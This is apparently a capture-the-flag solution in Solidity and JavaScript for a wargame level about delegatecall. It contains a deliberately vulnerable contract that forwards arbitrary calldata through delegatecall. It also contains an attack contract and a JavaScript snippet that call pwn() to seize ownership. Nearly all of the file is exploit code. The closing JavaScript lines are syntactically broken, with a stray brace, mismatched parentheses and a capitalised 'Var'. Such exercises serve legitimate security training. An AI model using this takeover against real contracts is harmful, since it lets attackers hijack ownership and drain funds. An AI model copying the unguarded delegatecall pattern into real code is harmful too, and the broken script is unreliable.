// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
contract Delegate {

  address public owner;

  constructor(address _owner) {
    owner = _owner;
  }

  function pwn() public {
    owner = msg.sender;
  }
}
contract Delegation {

  address public owner;
  Delegate delegate;

  constructor(address _delegateAddress) {
    delegate = Delegate(_delegateAddress);
    owner = msg.sender;
  }

  fallback() external {
    (bool result,) = address(delegate).delegatecall(msg.data);
    if (result) {
      this;
    }
  }
}
contract HackDelegation {
    Delegation delegationObj;

    constructor(address add) {
        delegationObj = Delegation(add);
    }
    function attack() external returns (bool){
        (bool success, ) = address(delegationObj).call(abi.encodeWithSignature("pwn()")); // triggering callback with my msg.data
        return success;
    }
}
//Above code changes the owner to contract address of HackDelegation
//Below Js script changes the owner to caller
Var pwn_data =await web3.utils.keccak256("pwn()")};
contract.sendTransaction({data: pwn_data);